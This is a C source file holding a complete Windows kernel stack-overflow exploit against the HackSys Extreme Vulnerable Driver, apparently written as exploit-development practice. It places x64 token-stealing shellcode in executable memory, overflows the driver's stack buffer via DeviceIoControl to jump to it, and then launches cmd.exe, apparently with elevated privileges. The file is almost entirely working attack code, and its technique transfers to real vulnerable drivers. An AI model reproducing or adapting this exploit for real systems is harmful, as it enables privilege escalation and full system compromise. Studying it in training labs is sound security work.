#include <stdio.h>
#include <Windows.h>

#define IO_CODE 0x222003
#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"

int main() {
	printf("[+] Calling CreateFileA to obtain a handle to HEVD Driver\n");
	HANDLE hDevice = CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE , 0, NULL, OPEN_EXISTING, 0, NULL);

	do {
		if (hDevice == INVALID_HANDLE_VALUE) {
			printf("[-] Error: Unable to obtain handle to HEVD Driver\n");
			break;
		}

		printf("[+] Successfully obtained handle to HEVD Driver\n");

		// Token stealing shellcode on Windows 10 VM (x64)
		BYTE payload[] =
		{
			0x52, 0x41, 0x50, 0x41, 0x51, 0x48, 0x31, 0xC0, 0x65, 0x48, 0x8B, 0x14,
			0x25, 0x88, 0x01, 0x00, 0x00, 0x4C, 0x8B, 0x82, 0xB8, 0x00, 0x00, 0x00,
			0x4D, 0x8B, 0x88, 0x48, 0x04, 0x00, 0x00, 0x49, 0x8B, 0x09, 0x48, 0x8B,
			0x51, 0xF8, 0x48, 0x83, 0xFA, 0x04, 0x74, 0x09, 0x48, 0x8B, 0x09, 0x4C,
			0x39, 0xC9, 0x75, 0xEE, 0xCC, 0x48, 0x8B, 0x41, 0x70, 0x24, 0xF0, 0x49,
			0x89, 0x80, 0xB8, 0x04, 0x00, 0x00, 0x48, 0x31, 0xF6, 0x48, 0x31, 0xFF,
			0x4D, 0x31, 0xFF, 0x4D, 0x31, 0xF6, 0x4D, 0x31, 0xE4, 0x48, 0x31, 0xC0,
			0x48, 0x83, 0xC4, 0x28, 0x5A, 0x41, 0x58, 0x41, 0x59, 0xC3
		};

		// Create executable memory region to store token stealing shellcode
		LPVOID Alloc = VirtualAlloc(NULL, sizeof(payload), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!Alloc) {
			printf("[-] Error - Unable to allocate shellcode.\n");
			break;
		}

		printf("[+] Successfully created executable memory region for payload at: 0x%p\n", Alloc);

		// Copy the token stealing shellcode into the executable memory region created by VirtalAlloc()
		RtlMoveMemory(Alloc, payload, sizeof(payload));
		printf("[+] Copied payload to executable memory\n");

		// Declare 'bytesRet' variable for 'DeviceIoControl->lpBytesReturned' parameter
		DWORD bytesRet;

		// Buffer to driver
		BYTE buffer[0x820] = { 0 };
		// Offset to stack
		const size_t offset = 0x818;

		// Fill 'expl' with 'A's
		memset(buffer, '\x41', offset);
		// Must be 48-bit [(addr) & 0x00007FFFFFFFFFFF]
		memcpy(buffer + offset, (PUINT64)&Alloc, 8);

		//memset(expl + offset + 0x4, 0x77, 0x4);
		// Write over rbx
		//memset(expl + offset + 0x8, 0x88, 0x4);

		// Interact with vulnerable "\\\\.\\HackSysExtremeVulnerableDriver" driver
		printf("[+] Starting interaction with the driver\n");
		DeviceIoControl(hDevice, IO_CODE, &buffer, sizeof(buffer), NULL, 0, &bytesRet, NULL);
		system("cmd.exe");
	} while (0);

	CloseHandle(hDevice);

	return 0;
}